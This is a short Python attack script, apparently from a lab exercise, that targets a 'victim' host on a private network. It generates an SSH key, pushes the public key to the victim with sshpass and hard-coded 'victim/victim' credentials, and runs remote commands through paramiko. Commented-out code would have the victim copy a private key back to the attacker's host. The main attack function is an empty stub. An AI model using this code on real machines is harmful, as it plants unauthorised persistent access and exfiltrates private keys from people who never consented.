import os
import paramiko


victim, attacker = {}, {}


def init():
    print('\n[Init] Setting up environment...')

    # Create ssh key
    command = 'ssh-keygen -f ~/.ssh/victim_key -P 12345'
    os.system(command)

    # Send public key to the victim
    command = 'sshpass -p {0} scp -P {1} ~/.ssh/victim_key.pub {2}@{3}:~/.ssh/'.format(victim['password'],
                                                                                       victim['port'],
                                                                                       victim['name'],
                                                                                       victim['ip'])
    os.system(command)
    pass


def attack():
    print('\nStart attacking...')
    pass


def ssh_command_using_name_pw(command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    client.connect(victim['ip'], username=victim['name'], password=victim['password'], port=victim['port'])

    session = client.get_transport().open_session()

    if session.active:
        print('Session Active')
        session.exec_command(command)

        print('\n--------Victim Std Out--------')
        print(session.recv(2048))
        print('--------Victim Std Out--------\n')

    else:
        print('Session Failed')


def ssh_command_using_ssh_key():
    pass


def set_up_user():
    print('[Victim]')
    # victim['ip'] = raw_input('ip: ')
    # victim['port'] = int(raw_input('port: '))
    # victim['name'] = raw_input('name: ')
    # victim['password'] = raw_input('password: ')

    victim['ip'] = '192.168.31.145'
    victim['port'] = 5555
    victim['name'] = 'victim'
    victim['password'] = 'victim'

    print('\n[Attacker]')
    # attacker['ip'] = raw_input('ip: ')
    # attacker['port'] = int(raw_input('port: '))
    # attacker['name'] = raw_input('name: ')
    # attacker['password'] = raw_input('password: ')

    attacker['ip'] = '192.168.31.101'
    attacker['port'] = 22
    attacker['name'] = 'victim'
    attacker['password'] = 'victim'


if __name__ == '__main__':
    # Set up user info
    set_up_user()

    # Check ssh key if exists
    if not os.path.isfile('/home/{0}/.ssh/victim_key'.format(attacker['name'])):
        init()

    attack()

    # # Set up ssh key
    # try:
    #     os.system('ssh-keygen -f /home/victim/.ssh/victim_key -P 12345')
    #
    # except Exception as e:
    #     print('[ERROR]', e)

    # # Send public key to the victim
    # try:
    #     print('\nUse victim/victim to ssh log into victim system')
    #     command = 'ssh-keygen -f /home/victim/.ssh/victim_key -P 12345\ny'
    #     ssh_command(victim['ip'], 'victim', 'victim', command, int(victim['port']))
    #
    #     command = 'sshpass -p {0} scp /home/victim/.ssh/victim_key {1}@{2}:/home/{3}/victimKey'.format(attacker['password'], attacker['name'], attacker['ip'], attacker['name'])
    #     print(command)
    #     ssh_command(victim['ip'], 'victim', 'victim', command, int(victim['port']))
    #
    # except Exception as e:
    #     print(e)
    #     print('\nUse private key to ssh log into victim system')





